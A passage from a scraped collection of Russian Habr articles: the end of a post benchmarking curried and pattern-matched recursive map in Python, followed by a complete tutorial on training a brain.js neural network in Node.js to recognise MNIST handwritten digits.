+ x limit = 10000 start = time() xs = [checker(x) for x in range(limit)][::-1] print('inline for:', time() - start) start = time() xs = list(map(checker, range(limit)))[::-1] print('map:', time() - start) calculate = curry_tail_r_map(checker) start = time() xs = calculate(range(limit))[::-1] print('r_map without pattern matching:', time() - start) calculate = r_map_really_tail_curry(checker) start = time() xs = calculate(range(limit))[::-1] print('r_map with pattern matching:', time() - start) После чего получим: inline for: 0.011110067367553711 map: 0.011012554168701172 r_map without pattern matching: 3.7527310848236084 r_map with pattern matching: 5.926968812942505 Вариант с pattern matching'ом оказался самым медленным, а встроенные map и for оказались самыми быстрыми. Заключение Из этой статьи в реальных приложениях можно использовать, пожалуй, только каррирование. Остальное либо нечитаемый, либо тормозной велосипед =) Все примеры доступны на github."], "hab": ["Функциональное программирование", "Python", "Ненормальное программирование"]}{"url": "https://habrahabr.ru/post/304414/", "title": ["Нейронные сети на Javascript"], "text": ["Идея для написания этой статьи возникла прошлым летом, когда я слушал доклад на конференции BigData по нейронным сетям. Лектор «посыпал» слушателей непривычными словечками «нейрон», «обучающая выборка», «тренировать модель»… «Ничего не понял — пора в менеджеры», — подумал я. Но недавно тема нейронных сетей все же коснулась моей работы и я решил на простом примере показать, как использовать этот инструмент на языке JavaScript. Мы создадим нейронную сеть, с помощью которой будем распознавать ручное написание цифры от 0 до 9. Рабочий пример займет несколько строк. Код будет понятен даже тем программистам, которые не имели дело с нейронными сетями ранее. Как это все работает, можно будет посмотреть прямо в браузере. Если вы уже знаете что такое Perceptron, следующую главу нужно пропустить. Совсем немного теории Нейронные сети возникли из исследований в области искусственного интеллекта, а именно, из попыток воспроизвести способность биологических нервных систем обучаться и исправлять ошибки, моделируя низкоуровневую структуру мозга. В простейшем случае она состоит из нескольких, соединенных между собой, нейронов. Математический нейрон Несложный автомат, преобразующий входные сигналы в результирующий выходной сигнал. Сигналы x1, x2, x3 … xn, поступая на вход, преобразуются линейным образом, т.е. к телу нейрона поступают силы: w1x1, w2x2, w3x3 … wnxn, где wi – веса соответствующих сигналов. Нейрон суммирует эти сигналы, затем применяет к сумме некоторую функцию f(x) и выдаёт полученный выходной сигнал y. В качестве функции f(x) чаще всего используется сигмоидная или пороговая функции. Пороговая функция может принимать только два дискретных значения 0 или 1. Смена значения функции происходит при переходе через заданный порог T.+ Сигмоидная – непрерывная функция, может принимать бесконечно много значений в диапазоне от 0 до 1. UPD: В комментариях также упоминаются функции ReLU и MaxOut как более современные. Архитектура нейронной сети может быть разной, мы рассмотрим одну из простых реализаций нейронной сети — Perceptron Архитектура Perceptron Есть слой входных нейронов (где информация поступает из вне), слой выходных нейронов (откуда можно взять результат) и ряд, так-называемых, скрытых слоев между ними. Нейроны могут быть расположены в несколько слоёв. Каждая связь между нейронами имеет свой вес Wij Входные и выходные сигналы Перед тем, как подавать сигналы на нейроны входящего слоя сети нам их нужно нормализовать. Нормализация входных данных — это процесс, при котором все входные данные проходят процесс «выравнивания», т.е. приведения к интервалу [0,1] или [-1,1]. Если не провести нормализацию, то входные данные будут оказывать дополнительное влияние на нейрон, что приведет к неверным решениям. Другими словами, как можно сравнивать величины разных порядков? На нейронах выходного слоя у нас тоже не будет чистой «1» или «0», это нормально. Есть некий порог, при котором мы будем считать, что получили «1» или «0». Про интерпретацию результатов поговорим позже. «Пример в студию, а то уже засыпаю» Для удобства я рекомендую себе поставить nodejs и npm. Мы будем описывать сеть с помощью библиотеки Brain.js. В конце статьи я также дам ссылки на другие библиотеки, которые можно будет сконфигурировать похожим образом. Brain.js мне понравился своей скоростью и возможностью сохранять натренированную модель. Давайте попробуем пример из документации — эмулятор функции XOR: var brain = require('brain.js'); var net = new brain.NeuralNetwork(); net.train([{input: [0, 0], output: [0]}, {input: [0, 1], output: [1]}, {input: [1, 0], output: [1]}, {input: [1, 1], output: [0]}]); var output = net.run([1, 0]); // [0.987] console.log(output); запишем все в файл simple1.js, чтоб пример заработал, поставим модуль brain и запустим npm install brain.js node simple1.js # [ 0.9331839217737243 ] У нас 2 входящих нейрона и один нейрон на выходе, библиотека brain.js сама сконфигурирует скрытый слой и установит там столько нейронов, сколько сочтет нужным (в этом примере 3 нейрона). То, что мы передали в метод .train называется обучающей выборкой, каждый элемент которой состоит из массива объектов со свойством input и output (массив входящих и выходящих параметров). Мы не проводили нормализацию входящих данных, так как сами данные уже приведены в нужную форму. Обратите внимание: мы на выходе получаем не [0.987] а [0.9331...]. У вас может быть немного другое значение. Это нормально, так как алгоритм обучения использует случайные числа при подборе весовых коэффициентов. Метод .run применяется для получения ответа нейронной сети на заданный в аргументе массив входящих сигналов. Другие простые примеры можно посмотреть в документации brain Распознаем цифры В начале нам нужно получить изображения с рукописными цифрами, приведенными к одному размеру. В нашем примере мы будем использовать модуль MNIST digits, набор тысяч 28x28px бинарных изображений рукописных цифр от 0 до 9: Оригинальная база данных MNIST содержит 60 000 примеров для обучения и 10 000 примеров для тестирования, ее можно можно загрузить с сайта LeCun. Автор MNIST digits сделал доступной часть этих примеров для языка JavaScript, в библиотеке уже проведена нормализация входящих сигналов. С помощью этого модуля мы можем получать обучающую и тестовую выборку автоматически. Мне пришлось клонировать библиотеку MNIST digits, так как там есть небольшая путаница с данными. Я повторно загрузил 10 000 примеров из оригинальной базы данных, так что использовать надо MNIST digits из моего репозитория. Конфигурация сети Во входном слое нам необходимо 28x28=784 нейрона, на выходе 10 нейронов. Скрытый слой brain.js сконфигурирует сам. Забегая наперед, уточню: там будет 392 нейрона. Обучающая выборка будет сформирована модулем mnist Тренируем модель Установим mnist npm install https://github.com/ApelSYN/mnist Все готово, обучаем сеть const brain = require('brain.js'); var net = new brain.NeuralNetwork(); const fs = require('fs'); const mnist = require('mnist'); const set = mnist.set(1000, 0); const trainingSet = set.training; net.train(trainingSet, { errorThresh: 0.005, // error threshold to reach iterations: 20000, // maximum training iterations log: true, // console.log() progress periodically logPeriod: 1, // number of iterations between logging learningRate: 0.3 // learning rate } ); let wstream = fs.createWriteStream('./data/mnistTrain.json'); wstream.write(JSON.stringify(net.toJSON(),null,2)); wstream.end(); console.log('MNIST dataset with Brain.js train done.') Создаем сеть, получаем 1000 элементов обучающей выборки, вызываем метод .train, который производит обучение сети — сохраняем все в файл './data/mnistTrain.json' (не забудьте создать папку \"./data\"). Если все сделали правильно, получите приблизительно такой результат: [root@HomeWebServer nn]# node train.js iterations: 0 training error: 0.060402555338691676 iterations: 1 training error: 0.02802436102035996 iterations: 2 training error: 0.020358600820106914 iterations: 3 training error: 0.0159533285799183 iterations: 4 training error: 0.012557029942873513 iterations: 5 training error: 0.010245175822114688 iterations: 6 training error: 0.008218147206099617 iterations: 7 training error: 0.006798613211310184 iterations: 8 training error: 0.005629051609641436 iterations: 9 training error: 0.004910207736789503 MNIST dataset with Brain.js train done. Все можно распознавать Осталось написать совсем немного кода — и система распознавания готова! const brain = require('brain.js'), mnist = require('mnist'); var net = new brain.NeuralNetwork(); const set = mnist.set(0, 1); const testSet = set.test; net.fromJSON(require('./data/mnistTrain')); var output = net.run(testSet[0].input); console.log(testSet[0].output); console.log(output); Получаем 1 случайный тестовый пример из выборки 10 000 записей, загружаем натренированную ранее модель, передаем на вход сети тестовую запись и смотрим правильно ли она распозналась. Вот пример выполнения [ 0, 0, 0, 1, 0, 0, 0, 0, 0, 0 ] [ 0.0002863506627761867, 0.00002389940760904011, 0.00039954062883041345, 0.9910109896013567, 7.562879202664903e-7, 0.0038756598319246837, 0.000016752919557362786, 0.0007205981595354964, 0.13699517762991756, 0.0011053963693377692 ] В примере в сеть на входящие нейроны поступила оцифрованная тройка (первый масив это идеальный ответ), на выходе сети мы получили массив елементов, один из которых близок к единице (0.9910109896013567) это тоже третий бит. Обратите внимание на четвертый бит там 7.56… в -7 степени, это такая форма записи чисел с плавающей точкой в JavaScript. Ну что же, распознавание прошло правильно. Поздравляю, наша сеть заработала! Немного «причешем» наши результаты функцией softmax, которую я взял из одного примера по машинному обучению: function softmax(output) { var maximum = output.reduce(function(p,c) { return p>c ? p : c; }); var nominators = output.map(function(e) { return Math.exp(e - maximum); }); var denominator = nominators.reduce(function (p, c) { return p + c; }); var softmax = nominators.map(function(e) { return e / denominator; }); var maxIndex = 0; softmax.reduce(function(p,c,i){if(p<c) {maxIndex=i; return c;} else return p;}); var result = []; for (var i=0; i<output.length; i++) { if (i==maxIndex) result.push(1); else result.push(0); } return result; } Функцию можно поместить в начало нашего кода и последнюю строку заменить на console.log(softmax(output)); Все друзья — теперь все работает красиво: [root@HomeWebServer nn]# node simpleRecognize.js [ 0, 0, 1, 0, 0, 0, 0, 0, 0, 0 ] [ 0, 0, 1, 0, 0, 0, 0, 0, 0, 0 ] [root@HomeWebServer nn]# node simpleRecognize.js [ 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 ] [ 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 ] [root@HomeWebServer nn]# node simpleRecognize.js [ 0, 0, 0, 0, 0, 0, 1, 0, 0, 0 ] [ 0, 0, 0, 0, 0, 0, 1, 0, 0, 0 ] Иногда сеть может давать неправильный результат (мы взяли небольшую выборку и поставили не достаточно строгую погрешность). А как распознать цифру, которую напишете вы? Конечно, тут нет никакой подтасовки, но все же хочется самому проверить «на прочность» то, что получилось. С помощью HTML5 Canvas и все тем же brain.js-ом с сохраненной моделью мне удалось сделать реализацию распознавания в браузере, часть кода для отрисовки и дизайн интерфейса я позаимствовал в интернете. Можете попробовать вживую. В мобильном устройстве рисовать можно пальцем. Ссылки по теме Библиотеки на JavaScript для работы с нейронными сетями brain.js Synaptic.js ConvNetJS Mind.js Все примеры из статьи на github Живой пример распознавания цифры в браузере Нейронные сети на JS. Создавая сеть с нуля [Eng] Почему стоит использовать библиотеку brain.js а не brain UPD: Альтернативные реализации живого примера 1, 2 на JavaScript из комментариев и личной переписки."], "hab": ["Машинное обучение", "Node.JS", "JavaScript", "Canvas", "Big Data"]}